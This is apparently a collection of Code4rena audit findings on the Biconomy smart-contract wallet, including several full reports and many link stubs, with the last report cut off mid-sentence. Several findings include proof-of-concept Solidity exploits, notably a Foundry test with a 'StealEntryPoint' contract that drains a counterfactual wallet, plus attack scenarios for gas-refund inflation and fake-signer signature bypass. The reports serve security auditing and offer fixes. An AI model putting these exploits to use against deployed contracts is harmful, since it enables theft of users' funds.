# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L200 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L239 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L248   # Vulnerability details  ## Description  The `execTransaction` function is designed to accept a relayed transaction with a transaction cost refund. At the beginning of the function, the `startGas` value is calculated as the amount of gas that the relayer will approximately spend on the transaction initialization, including the base cost of `21000` gas and the cost per calldata byte of `msg.data.length * 8` gas. At the end of the function, the total consumed gas is calculated as `gasleft() - startGas` and the appropriate refund is sent to the relayer.  An attacker could manipulate the calldata to increase the refund amount while spending less gas than what is calculated by the contract. To do this, the attacker could provide calldata with zero padded bytes of arbitrary length. This would only cost 4 gas per zero byte, but the refund would be calculated as 8 gas per calldata byte. As a result, the refund amount would be higher than the gas amount spent by the relayer.  ### Attack scenario  Let’s a smart wallet user signs a transaction. Some of the relayers trying to execute this transaction and send a transaction to the `SmartAccount` contract. Then, an attacker can frontrun the transaction, changing the transaction calldata by adding the zeroes bytes at the end.  So, the original transaction has such calldata:  ```sol= abi.encodeWithSignature(RelayerManager.execute.selector, (...)) ```  The modified (frontrun) transaction calldata:  ```sol= // Basically, just add zero bytes at the end abi.encodeWithSignature(RelayerManager.execute.selector, (...)) || 0x00[] ```  ### PoC  The PoC shows that the function may accept the data with redundant zeroes at the end. At the code above, an attacker send a 100_000 meaningless zeroes bytes, that gives a `100_000 * 4 = 400_000` additional gas refund. Technically, it is possible to pass even more zero bytes.  ```solidity= pragma solidity ^0.8.12;  contract DummySmartWallet {     function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) external {         // Do nothing, just test that data with appended zero bytes are accepted by Solidity     } }  contract PoC {     address immutable smartWallet;      constructor() {         smartWallet = address(new DummySmartWallet());     }      // Successfully call with original data     function testWithOriginalData() external {         bytes memory txCalldata = _getOriginalTxCalldata();          (bool success, ) = smartWallet.call(txCalldata);         require(success);     }      // Successfully call with original data + padded zero bytes     function testWithModifiedData() external {         bytes memory originalTxCalldata = _getOriginalTxCalldata();         bytes memory zeroBytes = new bytes(100000);          bytes memory txCalldata = abi.encodePacked(originalTxCalldata, zeroBytes);          (bool success, ) = smartWallet.call(txCalldata);         require(success);     }      function _getOriginalTxCalldata() internal pure returns(bytes memory) {         Transaction memory transaction;         FeeRefund memory refundInfo;         bytes memory signatures;         return abi.encodeWithSelector(DummySmartWallet.execTransaction.selector, transaction, uint256(0), refundInfo, signatures);     } } ```  ## Impact  An attacker to manipulate the gas refund amount to be higher than the gas amount spent, potentially leading to arbitrary big ether loses by a smart wallet.  ## Recommended Mitigation Steps  You can calculate the number of bytes used by the relayer as a sum per input parameter. Then an attacker won't have the advantage of providing non-standard ABI encoding for the PoC calldata.   ``` // Sum the length of each  bynamic and static length parameters. uint256 expectedNumberOfBytes = _tx.data.length + signatures.length + 12 * 32; uint256 dataLen = Math.min(msg.data.length, expectedNumberOfBytes); ```  Please note, the length of the `signature` must also be bounded to eliminate the possibility to put meaningless zeroes there.
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90   # Vulnerability details  # Cross-Chain Signature Replay Attack  ## Impact User operations can be replayed on smart accounts accross different chains. This can lead to user's loosing funds or any unexpected behaviour that transaction replay attacks usually lead to.  ## Proof of Concept As specified by the [EIP4337](https://eips.ethereum.org/EIPS/eip-4337) standard `to prevent replay attacks ... the signature should depend on chainid`. In [VerifyingSingletonPaymaster.sol#getHash](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90) the chainId is missing which means that the same UserOperation can be replayed on a different chain for the same smart contract account if the `verifyingSigner` is the same (and most likely this will be the case).  ## Tools Used Manual review  ## Recommended Mitigation Steps Add the chainId in the calculation of the UserOperation hash in [VerifyingSingletonPaymaster.sol#getHash](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90)  ```     function getHash(UserOperation calldata userOp)     public view returns (bytes32) { // @audit change to view         //can't use userOp.hash(), since it contains also the paymasterAndData itself.         return keccak256(abi.encode(                 userOp.getSender(),                 userOp.nonce,                 keccak256(userOp.initCode),                 keccak256(userOp.callData),                 userOp.callGasLimit,                 userOp.verificationGasLimit,                 userOp.preVerificationGas,                 userOp.maxFeePerGas,                 userOp.maxPriorityFeePerGas   block.chainid // @audit add chain id             ));     } ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0x1f8b-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45   # Vulnerability details  A counterfactual wallet can be used by pre-generating its address using the `SmartAccountFactory.getAddressForCounterfactualWallet` function. This address can then be securely used (for example, sending funds to this address) knowing in advance that the user will later be able to deploy it at the same address to gain control.  However, an attacker can deploy the counterfactual wallet on behalf of the owner and use an arbitrary entrypoint:  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45  ```solidity function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){     bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));     bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));     // solhint-disable-next-line no-inline-assembly     assembly {         proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)     }     require(address(proxy) != address(0), "Create2 call failed");     // EOA + Version tracking     emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);     BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);     isAccountExist[proxy] = true; } ```  As the entrypoint address doesn't take any role in the address generation (it isn't part of the salt or the init hash), then the attacker is able to use any arbitrary entrypoint while keeping the address the same as the pre-generated address.  ## Impact  After the attacker has deployed the wallet with its own entrypoint, this contract can be used to execute any arbitrary call or code (using `delegatecall`) using the `execFromEntryPoint` function:  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489-L492  ```solidity function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {             success = execute(dest, value, func, operation, gasLimit);     require(success, "Userop Failed"); } ```  This means the attacker has total control over the wallet, it can be used to steal any pre-existing funds in the wallet, change the owner, etc.  ## PoC  In the following test, the attacker deploys the counterfactual wallet using the `StealEntryPoint` contract as the entrypoint, which is then used to steal any funds present in the wallet.  ```solidity contract StealEntryPoint {     function steal(SmartAccount wallet) public {         uint256 balance = address(wallet).balance;          wallet.execFromEntryPoint(             msg.sender, // address dest             balance, // uint value             "", // bytes calldata func             Enum.Operation.Call, // Enum.Operation operation             gasleft() // uint256 gasLimit         );     } }  contract AuditTest is Test {     bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;      uint256 bobPrivateKey = 0x123;     uint256 attackerPrivateKey = 0x456;      address deployer;     address bob;     address attacker;     address entrypoint;     address handler;      SmartAccount public implementation;     SmartAccountFactory public factory;     MockToken public token;      function setUp() public {         deployer = makeAddr("deployer");         bob = vm.addr(bobPrivateKey);         attacker = vm.addr(attackerPrivateKey);         entrypoint = makeAddr("entrypoint");         handler = makeAddr("handler");          vm.label(deployer, "deployer");         vm.label(bob, "bob");         vm.label(attacker, "attacker");          vm.startPrank(deployer);         implementation = new SmartAccount();         factory = new SmartAccountFactory(address(implementation));         token = new MockToken();         vm.stopPrank();     }          function test_SmartAccountFactory_StealCounterfactualWallet() public {         uint256 index = 0;         address counterfactualWallet = factory.getAddressForCounterfactualWallet(bob, index);         // Simulate Bob sends 1 ETH to the wallet         uint256 amount = 1 ether;         vm.deal(counterfactualWallet, amount);          // Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)         vm.startPrank(attacker);          StealEntryPoint stealer = new StealEntryPoint();          address proxy = factory.deployCounterFactualWallet(bob, address(stealer), handler, index);         SmartAccount wallet = SmartAccount(payable(proxy));          // address is the same         assertEq(address(wallet), counterfactualWallet);          // trigger attack         stealer.steal(wallet);          vm.stopPrank();          // Attacker has stolen the funds         assertEq(address(wallet).balance, 0);         assertEq(attacker.balance, amount);     } } ```  ## Recommendation  This may need further discussion, but an easy fix would be to include the entrypoint as part of the salt. Note that the entrypoint used to generate the address must be kept the same and be used during the deployment of the counterfactual wallet.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/joestakey-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Aymen0909-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0x1f8b-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/betweenETHlines-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/lukris02-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Secureverse-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xSmartContract-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Udsen-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Kalzak-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Josiah-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Viktor_Cortess-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L460-L461 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L465-L466   # Vulnerability details  ## Description `execute` and `executeBatch` in `SmartAccount.sol` can only be called by owner, not EntryPoint:  ```javascript File: SmartAccount.sol  460:    function execute(address dest, uint value, bytes calldata func) external onlyOwner{ 461:        _requireFromEntryPointOrOwner(); 462:        _call(dest, value, func); 463:    } 464: 465:    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{ 466:        _requireFromEntryPointOrOwner(); 467:        require(dest.length == func.length, "wrong array lengths"); 468:        for (uint i = 0; i < dest.length;) { 469:            _call(dest[i], 0, func[i]); 470:            unchecked { 471:                ++i; 472:            } 473:        } 474:    } ```  From [EIP-4337](https://eips.ethereum.org/EIPS/eip-4337):  > - **Call the account with the `UserOperation`’s calldata.** It’s up to the account to choose how to parse the calldata; an expected workflow is for the account to have an execute function that parses the remaining calldata as a series of one or more calls that the account should make.  ## Impact This breaks the interaction with EntryPoint  ## Proof of Concept The reference implementation has both these functions without any onlyOwner modifiers:  https://github.com/eth-infinitism/account-abstraction/blob/develop/contracts/samples/SimpleAccount.sol#L56-L73 ```javascript 56:    /** 57:     * execute a transaction (called directly from owner, not by entryPoint) 58:     */ 59:    function execute(address dest, uint256 value, bytes calldata func) external { 60:        _requireFromEntryPointOrOwner(); 61:        _call(dest, value, func); 62:    } 63: 64:    /** 65:     * execute a sequence of transaction 66:     */ 67:    function executeBatch(address[] calldata dest, bytes[] calldata func) external { 68:        _requireFromEntryPointOrOwner(); 69:        require(dest.length == func.length, "wrong array lengths"); 70:        for (uint256 i = 0; i < dest.length; i++) { 71:            _call(dest[i], 0, func[i]); 72:        } 73:    } ```  ## Tools Used vscode  ## Recommended Mitigation Steps Remove `onlyOwner` modifier from `execute` and `executeBatch`
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/peanuts-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rickard-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/gz627-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/gz627-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/IllIllI-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/IllIllI-G.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L91   # Vulnerability details  ## Impact Detailed description of the impact of this finding.  ## Proof of Concept  for example, biconomy's wallet policy is - 1 eth for each wallet daily  and attacker does this - create userOp that spends 1 eth for gas - biconomy signs for that tx - attacker does not broadcast the tx and just withholds the signature - attacker creates another tx that spends 1 eth for gas - biconomy does check mainnet and finds out attack haven't spend any gas today so signs the tx - attacker broadcasts both tx(first one and the second one) - attacker spends 2 eth for gas in 1day  ## Tools Used  Contacting livingrock through discord  ## Recommended Mitigation Steps  use nonce per user in paymaster and use that to encode hash ``` contract VerifyingSingletonPaymaster is BasePaymaster {      using ECDSA for bytes32;     // possibly //  using Signatures for UserOperation;     using UserOperationLib for UserOperation;     using PaymasterHelpers for UserOperation;     using PaymasterHelpers for bytes;     using PaymasterHelpers for PaymasterData;      mapping(address => uint256) public paymasterIdBalances;     mapping(address => uint256) public senderNonce;     ...     function getHash(UserOperation calldata userOp)     public pure returns (bytes32) {         //can't use userOp.hash(), since it contains also the paymasterAndData itself.         address sender = userOp.getSender();         return keccak256(abi.encode(                 sender,                 userOp.nonce,                 keccak256(userOp.initCode),                 keccak256(userOp.callData),                 userOp.callGasLimit,                 userOp.verificationGasLimit,                 userOp.preVerificationGas,                 userOp.maxFeePerGas,                 userOp.maxPriorityFeePerGas,                 senderNonce[sender]             ));     } ``` 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/cryptostellar5-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Lirios-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/cthulhu_cult-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Diana-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L68-L86 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L168-L190   # Vulnerability details  ## Impact An attacker (e.g. a malicious bundler) could submit a bundle of high gas usage user operations with insufficient gas value, causing the bundle to fail even when the users calculated the gas limits correctly. This will result in a DoS for the user and the user/paymaster still have to pay for the execution, potentially draining their funds. This attack is possible as user operations are included by bundlers from the UserOperation mempool into the Ethereum block (see post on ERC-4337 https://medium.com/infinitism/erc-4337-account-abstraction-without-ethereum-protocol-changes-d75c9d94dc4a).  Reference for this issue: https://github.com/eth-infinitism/account-abstraction/commit/4fef857019dc2efbc415ac9fc549b222b07131ef  ## Proof of Concept In innerHandleOp(), a call was made to handle the operation with the specified mUserOp.callGasLimit. However, a malicious bundler could call the innerHandleOp() via handleOps() with a gas value that is insufficient for the transactions, resulting in the call to fail.   The remaining gas amount (e.g. gasLeft()) at this point was not verified to ensure that it is more than enough to fulfill the specified mUserOp.callGasLimit for the user operation. Even though the operation failed, the user/payment will still pay for the transactions due to the post operation logic.   https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L176   (bool success,bytes memory result) = address(mUserOp.sender).call{gas : mUserOp.callGasLimit}(callData);  ## Tools Used  ## Recommended Mitigation Steps Update the Account Abstraction implementation to the latest version. This will update the innerHandleOp() to verify that remaining gas is more than sufficient to cover the specified mUserOp.callGasLimit and mUserOp.verificationGasLimit.   Reference: https://github.com/eth-infinitism/account-abstraction/commit/4fef857019dc2efbc415ac9fc549b222b07131ef
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Atarpara-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/horsefacts-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L6 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L19 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342   # Vulnerability details  ## Impact  As Per [EIP-1271](https://eips.ethereum.org/EIPS/eip-1271) standard `ERC1271_MAGIC_VAULE` should be `0x1626ba7e` instead of `0x20c13b0b` and function name should be `isValidSignature(bytes32,bytes)` instead of  `isValidSignature(bytes,bytes)`. Due to this, signature verifier contract go fallback function and return unexpected value and never return `ERC1271_MAGIC_VALUE` and always revert `execTransaction` function.   ## Proof of Concept  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L6  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L19  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342   ## Tools Used Manual Review  ## Recommended Mitigation Steps Follow [EIP-1271](https://eips.ethereum.org/EIPS/eip-1271) standard. 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/shark-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/ast3ros-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/MyFDsYours-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xAgro-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/2997ms-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/SaharDevep-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rolezn-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rolezn-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L216   # Vulnerability details  ## Impact  The protocol supports 2D nonces through a `batchId` mechanism.  Due to different ways to execute transaction on the wallet there could be a collision between `batchIds` being used.  This can result in unexpected failing of transactions  ## Proof of Concept  There are two main ways to execute transaction from the smart wallet  1. Via EntryPoint - calls `execFromEntryPoint`/`execute` 2. Via `execTransaction`  `SmartAccount` has locked the `batchId` #0  to be used by the `EntryPoint`. When an `EntryPoint` calls `validateUserOp` before execution, the hardcoded nonce of `batchId` #0 will be incremented and validated, https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L501 ```     // @notice Nonce space is locked to 0 for AA transactions     // userOp could have batchId as well     function _validateAndUpdateNonce(UserOperation calldata userOp) internal override {         require(nonces[0]++ == userOp.nonce, "account: invalid nonce");     } ```  Calls to `execTransaction` are more immediate and are likely to be executed before a `UserOp` through `EntryPoint`. There is no limitation in `execTransaction` to use `batchId` #0 although it should be called only by `EntryPoint`.  If there is a call to `execTransaction` with `batchId` set to `0`. It will increment the nonce and `EntryPoint` transactions will revert. https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L216 ```     function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) public payable virtual override returns (bool success) { -------             nonces[batchId]++; -------         }     } ```  ## Tools Used  VS Code  ## Recommended Mitigation Steps  Add a requirement that `batchId` is not `0` in `execTransaction`:  `require(batchId != 0, "batchId 0 is used only by EntryPoint")`
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/zaskoh-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/hl_-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/sorrynotsorry-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/MalfurionWhitehat-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L97-L111   # Vulnerability details  ## Impact Openzeppelin canceled support for compact signatures in the ECDSA library after version 4.7.3, that is, it no longer supports recovery of signatures with a length of 64 ```  ## 4.7.3  ### Breaking changes   * `ECDSA`: `recover(bytes32,bytes)` and `tryRecover(bytes32,bytes)` no longer accept compact signatures to prevent malleability. Compact signature support remains available using `recover(bytes32,bytes32,bytes32)` and `tryRecover(bytes32,bytes32,bytes32)`.  ``` And biconomy uses the openzeppelin library above version 4.7.3  ```json     "@openzeppelin/contracts": "^4.7.3",     "@openzeppelin/contracts-upgradeable": "^4.7.3", ``` In the VerifyingSingletonPaymaster.validatePaymasterUserOp function, the code indicates that the signature with a length of 64 is still supported, but actually when the user uses a signature with a length of 64 in EntryPoint.handleOps, recover will return 0 address, the require statement fails, and validatePaymasterUserOp cannot work. ```solidity     function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)     external view override returns (bytes memory context, uint256 deadline) {         (requiredPreFund);         bytes32 hash = getHash(userOp);          PaymasterData memory paymasterData = userOp.decodePaymasterData();         uint256 sigLength = paymasterData.signatureLength;          //ECDSA library supports both 64 and 65-byte long signatures.         // we only "require" it here so that the revert reason on invalid signature will be of "VerifyingPaymaster", and not "ECDSA"         require(sigLength == 64 || sigLength == 65, "VerifyingPaymaster: invalid signature length in paymasterAndData");         require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), "VerifyingPaymaster: wrong signature");         require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], "Insufficient balance for paymaster id");         return (userOp.paymasterContext(paymasterData), 0);     } ``` ## Proof of Concept https://github.com/OpenZeppelin/openzeppelin-contracts/commit/e1878ace8c2908b85d39f9925c68c6f738cf3325 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/package.json#L61-L62 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L107-L108 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L363-L374 ## Tools Used None ## Recommended Mitigation Steps Change to ```diff     function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)     external view override returns (bytes memory context, uint256 deadline) {         (requiredPreFund);         bytes32 hash = getHash(userOp);          PaymasterData memory paymasterData = userOp.decodePaymasterData();         uint256 sigLength = paymasterData.signatureLength;          //ECDSA library supports both 64 and 65-byte long signatures.         // we only "require" it here so that the revert reason on invalid signature will be of "VerifyingPaymaster", and not "ECDSA" -       require(sigLength == 64 || sigLength == 65, "VerifyingPaymaster: invalid signature length in paymasterAndData"); +       require(sigLength == 65, "VerifyingPaymaster: invalid signature length in paymasterAndData");         require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), "VerifyingPaymaster: wrong signature");         require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], "Insufficient balance for paymaster id");         return (userOp.paymasterContext(paymasterData), 0);     } ```
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L511   # Vulnerability details  ## Impact As specified in the [EIP](https://eips.ethereum.org/EIPS/eip-4337#forbidden-opcodes) certain opcodes are forbidden when a UserOperation is validated because their outputs can differ between simulation and execution. One of those opcodes is `ORIGIN`. The SmartAccount uses that opcode in its validation logic. The client will reject those UserOperations because they are invalid. The wallet won't be usable with EIP-4337.  Because this breaks the main functionality of the wallet I rate it as HIGH.  ## Proof of Concept In `validateUserOp()` the contract calls `_validateSignature()` which in turn accesses `tx.origin` and thus the `ORIGIN` opcode: ```sol     function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)     external override virtual returns (uint256 deadline) {         _requireFromEntryPoint();         deadline = _validateSignature(userOp, userOpHash, aggregator);         if (userOp.initCode.length == 0) {             _validateAndUpdateNonce(userOp);         }         _payPrefund(missingAccountFunds);     }      function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address)     internal override virtual returns (uint256 deadline) {         bytes32 hash = userOpHash.toEthSignedMessageHash();         //ignore signature mismatch of from==ZERO_ADDRESS (for eth_callUserOp validation purposes)         // solhint-disable-next-line avoid-tx-origin         require(owner == hash.recover(userOp.signature) || tx.origin == address(0), "account: wrong signature");         return 0;     } ```  The EIP specifies that for the simulation, the client calls `EntryPoint.simulateValidation()`. That function calls account's `validateUserOp()` function which triggers the forbidden opcode: https://eips.ethereum.org/EIPS/eip-4337#specification-1  You can find it in the implementation as well: https://github.com/eth-infinitism/account-abstraction/blob/develop/contracts/core/EntryPoint.sol#L267-L273  ## Tools Used none  ## Recommended Mitigation Steps There's no real reason to check that `tx.origin == address(0)`. It's not specified in the EIP. Just remove it. 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/chrisdior4-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xdeadbeef0x-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342   # Vulnerability details  ## Impact  A hacker can create arbitrary transaction through the smart wallet by evading signature validation.   Major impacts: 1. Steal **all** funds from the smart wallet and destroy the proxy 2. Lock the wallet from EOAs by updating the implementation contract  1. New implementation can transfer all funds or hold some kind of ransom  2. New implementation can take time to unstake funds from protocols  ## Proof of Concept  The protocol supports contract signed transactions (eip-1271). The support is implemented in the `checkSignature` call when providing a transaction: https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L218 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342 ``` function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) public payable virtual override returns (bool success) { ---------             checkSignatures(txHash, txHashData, signatures);         } ---------             success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas); ---------         }     }  function checkSignatures(         bytes32 dataHash,         bytes memory data,         bytes memory signatures     ) public view virtual { ----------         if(v == 0) { ----------             _signer = address(uint160(uint256(r))); ----------                 require(uint256(s) >= uint256(1) * 65, "BSA021"); ----------                 require(uint256(s) + 32 <= signatures.length, "BSA022"); -----------                 assembly {                     contractSignatureLen := mload(add(add(signatures, s), 0x20))                 }                 require(uint256(s) + 32 + contractSignatureLen <= signatures.length, "BSA023"); -----------                 require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, "BSA024"); -----------     } ```  `checkSignature` **DOES NOT** Validate that the `_signer` or caller is the owner of the contract.   A hacker can craft a signature that bypasses the signature structure requirements and sets a hacker controlled `_signer` that always return `EIP1271_MAGIC_VALUE` from the `isValidSignature` function.   As `isValidSignature` returns `EIP1271_MAGIC_VALUE` and passed the requirements, the function `checkSignatures` returns gracefully and the transaction execution will continue. Arbitrary transactions can be set by the hacker.  ### Impact #1 - Self destruct and steal all funds  Consider the following scenario: 1. Hacker creates `FakeSigner` that always returns `EIP1271_MAGIC_VALUE`  2. Hacker creates `SelfDestructingContract` that `selfdestruct`s when called 3. Hacker calls the smart wallets `execTransaction` function  1. The transaction set will delegatecall to the `SelfDestructingContract` function to `selfdestruct`  2. The signature is crafted to validate against hacker controlled `FakeSigner` that always returns `EIP1271_MAGIC_VALUE` 4. Proxy contract is destroyed   1. Hacker received all funds that were in the wallet  ### Impact #2 - Update implementation and lock out EOA    1. Hacker creates 